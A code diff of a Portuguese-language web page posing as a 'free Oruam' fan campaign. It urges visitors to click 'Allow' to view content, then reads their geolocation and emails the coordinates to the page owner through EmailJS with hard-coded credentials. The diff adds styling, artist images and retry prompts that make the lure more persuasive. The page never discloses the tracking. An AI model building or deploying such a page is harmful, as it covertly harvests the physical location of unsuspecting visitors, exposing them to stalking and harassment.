@@ -3,16 +3,60 @@
 <head>
   <meta charset="UTF-8" />
   <title>Campanha LIBERDADE ORUAM</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif, Arial;
+      text-align: center;
+      padding: 20px;
+      background-color: #121212;
+      color: #fff;
+    }
+    img {
+      max-width: 300px;
+      margin: 20px auto;
+      display: block;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+    }
+    .message {
+      font-size: 1.3em;
+      margin-top: 20px;
+    }
+    a {
+      color: #1db954;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h1>🚨 Clique em "Permitir" para visualizar</h1>
-  <p>Estamos verificando...</p>
+
+  <div id="content">
+    <h1>🚨 Clique em "Permitir" para visualizar</h1>
+    <img src="https://i.imgur.com/L4vIh9m.jpg" alt="Mc Oruam" />
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    (function(){
-      emailjs.init("90mR73F6qLxhPODK9"); // ⬅️ Coloque aqui seu Public Key do EmailJS
-    })();
+    emailjs.init("90mR73F6qLxhPODK9"); // Public Key do EmailJS
+
+    const contentDiv = document.getElementById('content');
+
+    function showSuccess() {
+      contentDiv.innerHTML = `
+        <h1>✅ Obrigado pela visita!</h1>
+        <img src="https://i.imgur.com/3XRkxLX.jpg" alt="Obrigado Mc Oruam" />
+        <p><a href="https://www.youtube.com/watch?v=YOUR_VIDEO_ID" target="_blank">Ouça agora o Mc Oruam</a></p>
+      `;
+    }
+
+    function showError() {
+      contentDiv.innerHTML = `
+        <h1>❌ Oops, algo deu errado.</h1>
+        <img src="https://i.imgur.com/N7t91MJ.jpg" alt="Erro Mc Oruam" />
+        <p>Tente novamente e permita o acesso à localização.</p>
+      `;
+    }
 
     function enviarEmail(lat, lon) {
       const templateParams = {
@@ -23,10 +67,10 @@
 
       emailjs.send("service_kc6xk8y", "template_jt9au2d", templateParams)
         .then(function(response) {
-          document.body.innerHTML = "<h2>✅ Obrigado!</h2>";
+          showSuccess();
         }, function(error) {
-          document.body.innerHTML = "<h2>❌ Deu erro.</h2>";
-          console.log(error);
+          console.error(error);
+          showError();
         });
     }
 
@@ -39,15 +83,16 @@
             enviarEmail(lat, lon);
           },
           (error) => {
-            document.body.innerHTML = "<h2>❌ Deu erro.</h2>";
+            showError();
           }
         );
       } else {
-        document.body.innerHTML = "<h2>❌ Deu Erro.</h2>";
+        showError();
       }
     }
 
     obterLocalizacao();
   </script>
+
 </body>
 </html>
